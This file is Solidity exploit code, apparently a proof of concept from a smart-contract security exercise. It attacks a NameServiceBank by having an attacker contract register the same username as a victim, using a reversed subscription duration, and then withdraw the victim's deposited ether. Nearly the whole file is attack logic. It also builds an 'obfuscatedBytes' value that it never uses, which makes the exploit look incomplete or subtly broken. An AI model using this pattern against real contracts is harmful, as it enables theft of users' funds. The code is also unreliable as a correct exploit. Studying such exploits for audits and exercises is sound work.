// SPDX-License-Identifier: MIT
pragma solidity 0.7.0;

import "hardhat/console.sol";

interface INameServiceBank {
    function setUsername(
        string memory newUsername,
        uint256 obfuscationDegree,
        uint256[2] memory _usernameSubscriptionDuration
    ) external payable;

    function deposit() external payable;

    function withdraw(uint256 amount) external;

    function balanceOf(address user) external view returns (uint256);
}

contract NameServiceAttacker {
    INameServiceBank bank;

    constructor(address _bank) {
        bank = INameServiceBank(_bank);
    }

    function attack() public payable {
        uint256[2] memory duration;
        duration[0] = block.timestamp + 100;
        duration[1] = block.timestamp;

        string memory username = "abc";

        User victim = new User(bank);
        victim.setUsername{value: 1 ether}(username, 2, duration);
        victim.deposit{value: 2 ether}();

        bytes memory usernameBytes = bytes(username);
        bytes memory obfuscatedBytes = new bytes(usernameBytes.length + 1);
        for (uint256 i; i < usernameBytes.length; ++i) {
            obfuscatedBytes[i] = usernameBytes[i];
        }
        obfuscatedBytes[usernameBytes.length] = bytes1(uint8(0));
        User attacker = new User(bank);
        attacker.setUsername{value: 1 ether}(username, 2, duration);

        console.log("victim:", bank.balanceOf(address(victim)));
        console.log("attacker:", bank.balanceOf(address(attacker)));

        attacker.withdraw(bank.balanceOf(address(victim)));

        console.log("victim:", bank.balanceOf(address(victim)));
        console.log("attacker:", bank.balanceOf(address(attacker)));
    }
}

contract User {
    INameServiceBank bank;

    constructor(INameServiceBank _bank) {
        bank = _bank;
    }

    function setUsername(
        string memory newUsername,
        uint256 obfuscationDegree,
        uint256[2] memory _usernameSubscriptionDuration
    ) external payable {
        bank.setUsername{value: msg.value}(newUsername, obfuscationDegree, _usernameSubscriptionDuration);
    }

    function deposit() external payable {
        bank.deposit{value: msg.value}();
    }

    function withdraw(uint256 amount) external {
        bank.withdraw(amount);
    }

    receive() external payable {}
}
